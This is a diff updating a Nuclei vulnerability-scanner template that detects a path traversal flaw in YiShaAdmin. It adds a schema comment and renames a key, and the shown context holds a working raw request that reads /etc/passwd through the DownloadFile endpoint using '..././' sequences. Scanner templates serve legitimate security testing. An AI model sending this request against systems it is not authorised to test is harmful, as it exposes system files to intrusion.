@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: yishaadmin-lfi
 info:
   name: yishaadmin path traversal
@@ -8,7 +9,7 @@ info:
     - https://huntr.dev/bounties/2acdd87a-12bd-4ce4-994b-0081eb908128/
     - https://github.com/liukuo362573/YiShaAdmin/blob/master/YiSha.Util/YiSha.Util/FileHelper.cs#L181-L186
   tags: lfi,yishaadmin
-requests:
+http:
   - raw:
       - |
         GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0 HTTP/1.1
